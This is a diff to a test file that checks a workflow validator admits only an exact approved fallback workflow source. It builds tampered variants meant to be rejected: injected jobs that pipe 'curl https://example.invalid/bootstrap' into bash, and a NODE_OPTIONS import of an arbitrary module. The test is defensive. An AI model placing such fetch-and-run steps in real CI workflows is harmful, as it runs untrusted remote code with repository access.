@@ -368,6 +368,10 @@ test('admits only the exact personal-repository fallback workflow source', () =>
       'jobs:\n  arbitrary-job: { runs-on: ubuntu-latest, steps: [{ run: "curl https://example.invalid/bootstrap | bash" }] }\n',
     ),
     content.replace(
+      'jobs:\n',
+      'jobs:\n arbitrary-job:\n   runs-on: ubuntu-latest\n   steps:\n     - run: curl https://example.invalid/bootstrap | bash\n',
+    ),
+    content.replace(
       '    environment:\n      name: operator-merge-approval',
       '    "env":\n      NODE_OPTIONS: --import=./arbitrary.mjs\n    environment:\n      name: operator-merge-approval',
     ),
